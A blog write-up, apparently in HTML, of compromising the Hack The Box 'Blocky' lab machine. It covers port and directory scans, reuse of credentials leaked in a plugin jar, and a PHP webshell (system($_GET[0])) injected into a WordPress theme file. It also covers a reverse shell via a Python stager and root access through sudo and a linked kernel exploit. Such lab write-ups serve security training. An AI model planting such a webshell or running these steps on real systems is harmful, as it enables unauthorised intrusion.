@@ -1,0 +1,418 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>nullarmor | Blocky - Hack The Box</title>
+  <meta name="description" content="Resolution of the Blocky machine">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:title" content="Blocky - Hack The Box">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://nullarmor.github.io/posts/blocky">
+  <meta property="og:description" content="Resolution of the Blocky machine">
+  <meta property="og:site_name" content="nullarmor">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:url" content="https://nullarmor.github.io/posts/blocky">
+  <meta name="twitter:title" content="Blocky - Hack The Box">
+  <meta name="twitter:description" content="Resolution of the Blocky machine">
+  <meta name="google-site-verification" content="1sfOj2zDu7c444806MBQqbqFzNWxik880zgryQLMj-o" />
+
+  
+    
+      <meta property="og:image" content="https://nullarmor.github.io/assets/hackthebox/blocky/blocky-00-49e54ec9e62250e701fb31067de27a48770fbf1748d017fb0ee44513f846f694.png">
+      <meta name="twitter:image" content="https://nullarmor.github.io/assets/hackthebox/blocky/blocky-00-49e54ec9e62250e701fb31067de27a48770fbf1748d017fb0ee44513f846f694.png">
+    
+  
+
+  <link href="https://nullarmor.github.io/feed.xml" type="application/rss+xml" rel="alternate" title="nullarmor Last 10 blog posts" />
+
+  
+
+  
+
+    
+      <link rel="icon" type="image/x-icon" href="/assets/favicon-5df081ea197cddd592e345971da85e359e2f613dae2506c368835a695a297f82.gif">
+      <link rel="apple-touch-icon" href="/assets/favicon-5df081ea197cddd592e345971da85e359e2f613dae2506c368835a695a297f82.gif">
+      <link rel="stylesheet" type="text/css" title="light" id="light" href="/assets/light-fd3e34295723b96a04f635903b3650e5bb101ebdcc4d959165c3b4d2d88abe5e.css">
+      <link rel="stylesheet" type="text/css" title="dark" id="dark" href="/assets/dark-0f2545b8bdef934d32dd563b17074c614e7f4f4d5c3e682d4089a07fed36aa84.css" disabled="false">
+    
+
+  
+
+</head>
+
+<body>
+  <main>
+    <div class="grid grid-centered">
+      <div class="grid-cell">
+        <nav class="header-nav scrollappear">
+  <a href="/" class="header-logo" title="nullarmor">nullarmor</a>
+  <ul class="header-links">
+    
+      <li>
+        <a href="/about" title="About me">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-about">
+  <use href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about" xlink:href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+      <li>
+        <a href="https://twitter.com/nullarmor" rel="noreferrer noopener" target="_blank" title="Twitter">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-twitter">
+  <use href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter" xlink:href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+      <li>
+        <a href="https://github.com/nullarmor" rel="noreferrer noopener" target="_blank" title="GitHub">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-github">
+  <use href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github" xlink:href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="https://www.linkedin.com/in/renan-almeida-8137a81a6" rel="noreferrer noopener" target="_blank" title="LinkedIn">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-linkedin">
+  <use href="/assets/linkedin-cdc5c107044324a3dfbea2e9ead15873f8dee304c37d73a046988956b706256e.svg#icon-linkedin" xlink:href="/assets/linkedin-cdc5c107044324a3dfbea2e9ead15873f8dee304c37d73a046988956b706256e.svg#icon-linkedin"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="mailto:nullarmor@protonmail.com" title="Email">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-email">
+  <use href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email" xlink:href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+      <li>
+        <a onclick="toggle()" title="Toggle Theme">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-theme">
+  <use href="/assets/theme-66869e0bf8dab34bae1c86bda400327b772e0be69e8dc28d3ede896e771320ed.svg#icon-theme" xlink:href="/assets/theme-66869e0bf8dab34bae1c86bda400327b772e0be69e8dc28d3ede896e771320ed.svg#icon-theme"></use>
+</svg>
+
+        </a>
+      </li>
+    
+  </ul>
+</nav>
+
+
+  <ul class="header-tags scrollappear">
+    
+    
+      
+        <li><a href="/tag/ctf">Ctf</a></li>
+    
+      
+        <li><a href="/tag/cybrics">Cybrics</a></li>
+    
+      
+        <li><a href="/tag/hackthebox">Hackthebox</a></li>
+    
+      
+        <li><a href="/tag/hacktivitycon">Hacktivitycon</a></li>
+    
+      
+        <li><a href="/tag/pwn">Pwn</a></li>
+    
+      
+        <li><a href="/tag/rev">Rev</a></li>
+    
+      
+        <li><a href="/tag/rgbctf">Rgbctf</a></li>
+    
+      
+        <li><a href="/tag/web">Web</a></li>
+    
+  </ul>
+
+
+        <article class="article scrollappear">
+          <header class="article-header">
+            <h1>Blocky - Hack The Box</h1>
+            <p>Resolution of the Blocky machine</p>
+            <div class="article-list-footer">
+  <span class="article-list-date">
+    June 30, 2020
+  </span>
+  <span class="article-list-divider">-</span>
+  <span class="article-list-minutes">
+    
+    
+      4 minute read
+    
+  </span>
+  <span class="article-list-divider">-</span>
+  <div class="article-list-tags">
+    
+      
+      <a href="/tag/hackthebox" title="See all posts with tag 'HackTheBox'">HackTheBox</a>
+    
+  </div>
+</div>
+          </header>
+
+          <div class="article-content">
+            <p><a href="/assets/hackthebox/blocky/blocky-00-49e54ec9e62250e701fb31067de27a48770fbf1748d017fb0ee44513f846f694.png">
+  <img src="/assets/hackthebox/blocky/blocky-00-49e54ec9e62250e701fb31067de27a48770fbf1748d017fb0ee44513f846f694.png" alt="Bashed banner" class="zooming" data-rjs="/assets/hackthebox/blocky/blocky-00-49e54ec9e62250e701fb31067de27a48770fbf1748d017fb0ee44513f846f694.png" data-zooming-width="596" data-zooming-height="378" />
+</a></p>
+
+<p>Blocky is an easy level machine based on Linux, the initial approach is based on <code class="highlighter-rouge">enumeration</code>. Has two ways to get into the server and two ways to escalate to root user during the post exploitation.
+The privilege escalation process is pretty fast and doesn’t require much time.</p>
+
+<h1 id="recon">Recon</h1>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># Nmap 7.80 scan initiated Sun Apr 12 21:03:19 2020 as: nmap -sC -sV -T4 -oA blocky 10.10.10.37</span>
+Nmap scan report <span class="k">for </span>10.10.10.37
+Host is up <span class="o">(</span>0.15s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 996 filtered ports
+PORT     STATE  SERVICE VERSION
+21/tcp   open   ftp     ProFTPD 1.3.5a
+22/tcp   open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp   open   http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-generator: WordPress 4.8
+|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: BlockyCraft &amp;#8211<span class="p">;</span> Under Construction!
+8192/tcp closed sophos
+Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Sun Apr 12 21:03:43 2020 -- 1 IP address (1 host up) scanned in 24.63 seconds</span></code></pre></figure>
+
+<p>Verifying the port 80, there’s a <code class="highlighter-rouge">WordPress</code> blog where the author describes his server as a Minecraft server.</p>
+
+<p><a href="/assets/hackthebox/blocky/blocky-01-b1a97367065e98ab454238a0a30bb7e7ec024f3de184756aba14be940a523030.png">
+  <img src="/assets/hackthebox/blocky/blocky-01-b1a97367065e98ab454238a0a30bb7e7ec024f3de184756aba14be940a523030.png" alt="Blocky Recon" class="zooming" data-rjs="/assets/hackthebox/blocky/blocky-01-b1a97367065e98ab454238a0a30bb7e7ec024f3de184756aba14be940a523030.png" data-zooming-width="1205" data-zooming-height="554" />
+</a></p>
+
+<p>Enumerating the web directories using gobuster results in the following output:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">./gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/wordlists/dirb/big.txt <span class="nt">-u</span> http://10.10.10.37 <span class="nt">-t</span> 20
+<span class="o">===============================================================</span>
+Gobuster v3.0.1
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:            http://10.10.10.37
+<span class="o">[</span>+] Threads:        20
+<span class="o">[</span>+] Wordlist:       /usr/share/wordlists/dirb/big.txt
+<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
+<span class="o">[</span>+] User Agent:     gobuster/3.0.1
+<span class="o">[</span>+] Timeout:        10s
+<span class="o">===============================================================</span>
+2020/04/13 15:14:58 Starting gobuster
+<span class="o">===============================================================</span>
+/.htpasswd <span class="o">(</span>Status: 403<span class="o">)</span>
+/.htaccess <span class="o">(</span>Status: 403<span class="o">)</span>
+/javascript <span class="o">(</span>Status: 301<span class="o">)</span>
+/phpmyadmin <span class="o">(</span>Status: 301<span class="o">)</span>
+/plugins <span class="o">(</span>Status: 301<span class="o">)</span>
+/server-status <span class="o">(</span>Status: 403<span class="o">)</span>
+/wiki <span class="o">(</span>Status: 301<span class="o">)</span>
+/wp-admin <span class="o">(</span>Status: 301<span class="o">)</span>
+/wp-content <span class="o">(</span>Status: 301<span class="o">)</span>
+/wp-includes <span class="o">(</span>Status: 301<span class="o">)</span>
+<span class="o">===============================================================</span>
+2020/04/13 15:18:17 Finished
+<span class="o">===============================================================</span></code></pre></figure>
+
+<h1 id="exploiting---login-through-credentials-leak-1st-method">Exploiting - Login through credentials leak (1st method)</h1>
+
+<p>There’s a web directory named <code class="highlighter-rouge">/plugins</code> with 2 files, <code class="highlighter-rouge">BlockyCore.jar</code> seems to be interesting.
+Unziping this file we get a file named <code class="highlighter-rouge">BlockyCore.class</code> that contains juicy informations regarding the internal database:</p>
+
+<p><a href="/assets/hackthebox/blocky/blocky-02-3a3ea8738cd42c8d44ddd5e4c676233849242317ac217387b896adb01e5655e7.png">
+  <img src="/assets/hackthebox/blocky/blocky-02-3a3ea8738cd42c8d44ddd5e4c676233849242317ac217387b896adb01e5655e7.png" alt="Blocky Exploit" class="zooming" data-rjs="/assets/hackthebox/blocky/blocky-02-3a3ea8738cd42c8d44ddd5e4c676233849242317ac217387b896adb01e5655e7.png" data-zooming-width="577" data-zooming-height="407" />
+</a></p>
+
+<p>Using these credentials on <code class="highlighter-rouge">/phpmyadmin</code> works as expected!</p>
+
+<p><a href="/assets/hackthebox/blocky/blocky-03-a57e127d7ffc91be8b9eba9acc18473d5426c7a26f184cf8da29394e6ddc82ec.png">
+  <img src="/assets/hackthebox/blocky/blocky-03-a57e127d7ffc91be8b9eba9acc18473d5426c7a26f184cf8da29394e6ddc82ec.png" alt="Blocky Exploit" class="zooming" data-rjs="/assets/hackthebox/blocky/blocky-03-a57e127d7ffc91be8b9eba9acc18473d5426c7a26f184cf8da29394e6ddc82ec.png" data-zooming-width="835" data-zooming-height="552" />
+</a></p>
+
+<p><a href="/assets/hackthebox/blocky/blocky-04-da1502940469f95139747a9c0bb9412a77b519e850c032e00532780a4d3c2851.png">
+  <img src="/assets/hackthebox/blocky/blocky-04-da1502940469f95139747a9c0bb9412a77b519e850c032e00532780a4d3c2851.png" alt="Blocky Exploit" class="zooming" data-rjs="/assets/hackthebox/blocky/blocky-04-da1502940469f95139747a9c0bb9412a77b519e850c032e00532780a4d3c2851.png" data-zooming-width="1305" data-zooming-height="480" />
+</a></p>
+
+<p><a href="/assets/hackthebox/blocky/blocky-05-d898b386b5e1882128f552d3cbcb2e293bd95d8008bb806c36b4d358b352efe8.png">
+  <img src="/assets/hackthebox/blocky/blocky-05-d898b386b5e1882128f552d3cbcb2e293bd95d8008bb806c36b4d358b352efe8.png" alt="Blocky Exploit" class="zooming" data-rjs="/assets/hackthebox/blocky/blocky-05-d898b386b5e1882128f552d3cbcb2e293bd95d8008bb806c36b4d358b352efe8.png" data-zooming-width="1303" data-zooming-height="468" />
+</a></p>
+
+<p>Reusing these credentials at SSH works too!</p>
+
+<p><a href="/assets/hackthebox/blocky/blocky-06-c52dedb8c6992a513aabb932b5c803c21d4e5ad9ff8301a599af25e2ae281ce9.png">
+  <img src="/assets/hackthebox/blocky/blocky-06-c52dedb8c6992a513aabb932b5c803c21d4e5ad9ff8301a599af25e2ae281ce9.png" alt="Blocky Exploit" class="zooming" data-rjs="/assets/hackthebox/blocky/blocky-06-c52dedb8c6992a513aabb932b5c803c21d4e5ad9ff8301a599af25e2ae281ce9.png" data-zooming-width="694" data-zooming-height="280" />
+</a></p>
+
+<h1 id="exploiting---injecting-a-php-webshell-into-a-wordpress-plugin-2nd-method">Exploiting - Injecting a PHP webshell into a WordPress plugin (2nd method)</h1>
+
+<p>In this method we need to change the <code class="highlighter-rouge">Notch</code> Wordpress user password through <code class="highlighter-rouge">phpmyadmin</code>.</p>
+
+<p>First of all: Generate a PHP5 password hash using this site: <a href="http://www.passwordtool.hu/php5-password-hash-generator" target="_blank">http://www.passwordtool.hu/php5-password-hash-generator</a></p>
+
+<p><a href="/assets/hackthebox/blocky/blocky-07-06ed7bed23c58ba7eebbe141414f552e88613d0fd223b0b138f0a43166dd5270.png">
+  <img src="/assets/hackthebox/blocky/blocky-07-06ed7bed23c58ba7eebbe141414f552e88613d0fd223b0b138f0a43166dd5270.png" alt="Blocky Exploit" class="zooming" data-rjs="/assets/hackthebox/blocky/blocky-07-06ed7bed23c58ba7eebbe141414f552e88613d0fd223b0b138f0a43166dd5270.png" data-zooming-width="922" data-zooming-height="371" />
+</a></p>
+
+<p>Then we replace the old hash with the new one:</p>
+
+<p><a href="/assets/hackthebox/blocky/blocky-08-a3210679cec889999fc4eb99954c26e25881caf7fd0629c0ed32b93a66283597.png">
+  <img src="/assets/hackthebox/blocky/blocky-08-a3210679cec889999fc4eb99954c26e25881caf7fd0629c0ed32b93a66283597.png" alt="Blocky Exploit" class="zooming" data-rjs="/assets/hackthebox/blocky/blocky-08-a3210679cec889999fc4eb99954c26e25881caf7fd0629c0ed32b93a66283597.png" data-zooming-width="1306" data-zooming-height="507" />
+</a></p>
+
+<p>Now we need to inject a malicious PHP code inside a WordPress .php file, <code class="highlighter-rouge">page.php</code> from <code class="highlighter-rouge">Twenty Seventeen</code> plugin is the perfect target:</p>
+
+<p><a href="/assets/hackthebox/blocky/blocky-09-bb2825e620ed4fcb50c2eab37f2019a38bdd90ca2018135a75dec65a10b17904.png">
+  <img src="/assets/hackthebox/blocky/blocky-09-bb2825e620ed4fcb50c2eab37f2019a38bdd90ca2018135a75dec65a10b17904.png" alt="Blocky Exploit" class="zooming" data-rjs="/assets/hackthebox/blocky/blocky-09-bb2825e620ed4fcb50c2eab37f2019a38bdd90ca2018135a75dec65a10b17904.png" data-zooming-width="1304" data-zooming-height="516" />
+</a></p>
+
+<p>The malicious PHP code:</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Our PHP webshell will be located at <code class="highlighter-rouge">/wp-content/themes/twentyseventeen/page.php</code></p>
+
+<p><a href="/assets/hackthebox/blocky/blocky-10-854c183b8e8cb4044e0dbd46f56d53ddabfc734fd5a90971ea4fb510644572f9.png">
+  <img src="/assets/hackthebox/blocky/blocky-10-854c183b8e8cb4044e0dbd46f56d53ddabfc734fd5a90971ea4fb510644572f9.png" alt="Blocky Exploit" class="zooming" data-rjs="/assets/hackthebox/blocky/blocky-10-854c183b8e8cb4044e0dbd46f56d53ddabfc734fd5a90971ea4fb510644572f9.png" data-zooming-width="823" data-zooming-height="153" />
+</a></p>
+
+<p>We set up a netcat on listening mode and send a GET request with a Python reverse shell stager to the webshell parameter, after that we get a reverse shell connection!</p>
+
+<p><a href="/assets/hackthebox/blocky/blocky-11-8a7358b5f0ffd548e13bcfb479a3149662896eb65706ef4683caaa9f76694f09.png">
+  <img src="/assets/hackthebox/blocky/blocky-11-8a7358b5f0ffd548e13bcfb479a3149662896eb65706ef4683caaa9f76694f09.png" alt="Blocky Exploit" class="zooming" data-rjs="/assets/hackthebox/blocky/blocky-11-8a7358b5f0ffd548e13bcfb479a3149662896eb65706ef4683caaa9f76694f09.png" data-zooming-width="515" data-zooming-height="94" />
+</a></p>
+
+<h1 id="exploiting---using-a-custom-exploit">Exploiting - Using a custom exploit</h1>
+
+<p>For knowledge purposes I made a custom exploit that authenticates on WordPress, inject the malicious PHP code into the plugin, trigger with the Python stager and spawn an interactive shell to us, it’s available on my GitHub :)</p>
+
+<p><a href="https://github.com/nullarmor/hackthebox-exploits/tree/master/blocky" target="_blank">Blocky Exploit</a></p>
+
+<p><a href="/assets/hackthebox/blocky/blocky-12-4b8dbda2556397c582e5aa58c703f80020e8452de262df814db0da11e429efec.png">
+  <img src="/assets/hackthebox/blocky/blocky-12-4b8dbda2556397c582e5aa58c703f80020e8452de262df814db0da11e429efec.png" alt="Blocky Exploit" class="zooming" data-rjs="/assets/hackthebox/blocky/blocky-12-4b8dbda2556397c582e5aa58c703f80020e8452de262df814db0da11e429efec.png" data-zooming-width="929" data-zooming-height="276" />
+</a></p>
+
+<h1 id="post-exploitation---escalating-privileges-in-matter-of-seconds-1st-method">Post Exploitation - Escalating privileges in matter of seconds (1st method)</h1>
+
+<p>After the reverse shell connection, we need to enumerate the system. We easily found a weak point that can be used to escalate our privileges without any restriction.</p>
+
+<p>With <code class="highlighter-rouge">sudo -l</code> we noticed that the <code class="highlighter-rouge">notch</code> user is able to run everything as sudo, then all we need to do is elevate our privileges to root with <code class="highlighter-rouge">sudo su</code>:</p>
+
+<p><a href="/assets/hackthebox/blocky/blocky-13-2ef3258bc2e29047b60965bdc775197478cc1dd019f72bf3da1a2ab331cfadc0.png">
+  <img src="/assets/hackthebox/blocky/blocky-13-2ef3258bc2e29047b60965bdc775197478cc1dd019f72bf3da1a2ab331cfadc0.png" alt="Blocky Exploit" class="zooming" data-rjs="/assets/hackthebox/blocky/blocky-13-2ef3258bc2e29047b60965bdc775197478cc1dd019f72bf3da1a2ab331cfadc0.png" data-zooming-width="836" data-zooming-height="192" />
+</a></p>
+
+<p>Done, now we’re root!</p>
+
+<h1 id="post-exploitation---escalating-privileges-through-a-kernel-exploit-2nd-method">Post Exploitation - Escalating privileges through a kernel exploit (2nd method)</h1>
+
+<p>Doing a basic enumeration, we noticed that the server’s kernel version is vulnerable, this vulnerability has the <code class="highlighter-rouge">CVE 2017-6074</code>.</p>
+
+<p><a href="https://www.exploit-db.com/exploits/41458" target="_blank">Linux Kernel 4.4.0 (Ubuntu) - DCCP Double-Free Privilege Escalation</a></p>
+
+<p>After compile the exploit locally, send it to the machine through Python SimpleHTTPServer and execute, we easily got a root shell!</p>
+
+<p><a href="/assets/hackthebox/blocky/blocky-14-15d5ff05ecd1ea097de784a2d14c927c2ab3967b854bebc3dfe312a7ee8bf607.png">
+  <img src="/assets/hackthebox/blocky/blocky-14-15d5ff05ecd1ea097de784a2d14c927c2ab3967b854bebc3dfe312a7ee8bf607.png" alt="Blocky Exploit" class="zooming" data-rjs="/assets/hackthebox/blocky/blocky-14-15d5ff05ecd1ea097de784a2d14c927c2ab3967b854bebc3dfe312a7ee8bf607.png" data-zooming-width="494" data-zooming-height="311" />
+</a></p>
+
+<blockquote>
+  <p>! THIS EXPLOIT WILL CRASH THE SERVER AFTER SOME MINUTES !</p>
+</blockquote>
+
+          </div>
+          <div class="article-share">
+            
+            
+            <a href="https://twitter.com/home?status=Blocky+-+Hack+The+Box%20-%20https://nullarmor.github.io/posts/blocky%20by%20@nullarmor" title="Share on Twitter" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M492 109.5c-17.4 7.7-36 12.9-55.6 15.3 20-12 35.4-31 42.6-53.6 -18.7 11.1-39.4 19.2-61.5 23.5C399.8 75.8 374.6 64 346.8 64c-53.5 0-96.8 43.4-96.8 96.9 0 7.6 0.8 15 2.5 22.1 -80.5-4-151.9-42.6-199.6-101.3 -8.3 14.3-13.1 31-13.1 48.7 0 33.6 17.2 63.3 43.2 80.7C67 210.7 52 206.3 39 199c0 0.4 0 0.8 0 1.2 0 47 33.4 86.1 77.7 95 -8.1 2.2-16.7 3.4-25.5 3.4 -6.2 0-12.3-0.6-18.2-1.8 12.3 38.5 48.1 66.5 90.5 67.3 -33.1 26-74.9 41.5-120.3 41.5 -7.8 0-15.5-0.5-23.1-1.4C62.8 432 113.7 448 168.3 448 346.6 448 444 300.3 444 172.2c0-4.2-0.1-8.4-0.3-12.5C462.6 146 479 129 492 109.5z"/></svg>
+            </a>
+            <a href="https://www.facebook.com/sharer/sharer.php?u=https://nullarmor.github.io/posts/blocky" title="Share on Facebook" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M288 192v-38.1c0-17.2 3.8-25.9 30.5-25.9H352V64h-55.9c-68.5 0-91.1 31.4-91.1 85.3V192h-45v64h45v192h83V256h56.4l7.6-64H288z"/></svg>
+            </a>
+          </div>
+
+          
+            <div id="disqus_thread" class="article-comments"></div>
+            <script src="https://nullarmor.disqus.com/embed.js" async defer></script>
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+          
+        </article>
+        <footer class="footer scrollappear">
+  <p>
+    This site uses Chalk theme made by Nielsen Ramon.
+  </p>
+</footer>
+
+      </div>
+    </div>
+  </main>
+  
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-159304176-1"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'UA-159304176-1');
+  </script>
+
+
+<script type="text/javascript" src="/assets/vendor-2c224c53eb697c739f9490c38819a72184f09472739fd9e492272ef174090428.js"></script>
+
+
+  <script type="text/javascript" src="/assets/webfonts-96493456d319d1bf419afdf8701552d4d486fee6afd304897d4fd81eb4e0cc0b.js"></script>
+
+
+
+  <script type="text/javascript" src="/assets/scrollappear-e2da8ea567e418637e31266cc5302126eaa79f62a2273739086358b589a89ee6.js"></script>
+
+
+<script type="text/javascript" src="/assets/application-cfde13ac81ddaf4351b2e739603e2baf688d0fcc9aba613fe62bbb1c7b037fb9.js"></script>
+
+
+  <script type="text/javascript" src="/assets/themetoggle-df0d3d73164dc26dffbd630182ae4d0dfa7bee6b694a2b5d565d73595b582bbf.js"></script>
+
+</body>
+</html>
